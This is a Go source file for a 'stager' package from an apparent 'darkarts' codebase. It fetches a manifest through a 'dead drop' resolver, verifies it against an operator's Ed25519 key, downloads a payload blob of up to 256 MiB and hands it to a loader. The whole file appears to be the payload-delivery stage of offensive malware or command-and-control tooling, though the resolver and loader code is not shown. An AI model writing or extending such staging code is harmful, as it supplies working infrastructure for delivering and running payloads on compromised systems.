package stager

import (
	"context"
	"crypto/ed25519"
	"encoding/json"
	"errors"
	"log/slog"
	"time"

	"darkarts/pkg/deaddrop"
	"darkarts/pkg/store"
)

const maxStageSize = 256 << 20

type Options struct {
	Resolver    deaddrop.Resolver
	Store       store.Store
	OperatorPub ed25519.PublicKey
	MaxSize     int64
	Timeout     time.Duration
	Log         *slog.Logger
}

type Result struct {
	Manifest *Manifest
	Blob     []byte
}

type Stager struct {
	resolver    deaddrop.Resolver
	store       store.Store
	operatorPub ed25519.PublicKey
	maxSize     int64
	timeout     time.Duration
	log         *slog.Logger
}

func New(opts Options) (*Stager, error) {
	if opts.Resolver == nil {
		return nil, errors.New("stager: resolver required")
	}
	if len(opts.OperatorPub) == 0 {
		return nil, errors.New("stager: operator public key required")
	}
	maxSize := opts.MaxSize
	if maxSize <= 0 {
		maxSize = maxStageSize
	}
	timeout := opts.Timeout
	if timeout <= 0 {
		timeout = 30 * time.Second
	}
	if opts.Log == nil {
		opts.Log = slog.Default()
	}
	return &Stager{
		resolver: opts.Resolver, store: opts.Store, operatorPub: opts.OperatorPub,
		maxSize: maxSize, timeout: timeout, log: opts.Log,
	}, nil
}

func (s *Stager) Fetch(ctx context.Context, manifestRef string) (*Result, error) {
	ctx, cancel := context.WithTimeout(ctx, s.timeout)
	defer cancel()

	raw, err := s.resolver.Resolve(ctx, manifestRef)
	if err != nil {
		return nil, err
	}
	var m Manifest
	if err := json.Unmarshal(raw, &m); err != nil {
		return nil, ErrBadManifest
	}
	if err := m.Verify(s.operatorPub); err != nil {
		s.log.Warn("stage manifest rejected", "ref", manifestRef, "err", err)
		return nil, err
	}
	s.log.Info("stage manifest verified", "manifest", m.String())

	var blob []byte
	if s.store != nil {
		blob, err = s.store.Get(ctx, m.Ref)
	} else {
		blob, err = s.resolver.Resolve(ctx, m.Ref)
	}
	if err != nil {
		return nil, err
	}
	if int64(len(blob)) > s.maxSize {
		return nil, ErrBlobTooLarge
	}
	if err := m.VerifyBlob(blob); err != nil {
		s.log.Warn("stage blob rejected", "ref", m.Ref, "err", err)
		return nil, err
	}
	s.log.Info("stage blob verified", "ref", m.Ref, "size", len(blob))
	return &Result{Manifest: &m, Blob: blob}, nil
}

func (s *Stager) FetchAndLoad(ctx context.Context, manifestRef string, l Loader) (*Result, error) {
	res, err := s.Fetch(ctx, manifestRef)
	if err != nil {
		return nil, err
	}
	if err := l.Load(ctx, res.Manifest.Kind, res.Blob); err != nil {
		return nil, err
	}
	return res, nil
}
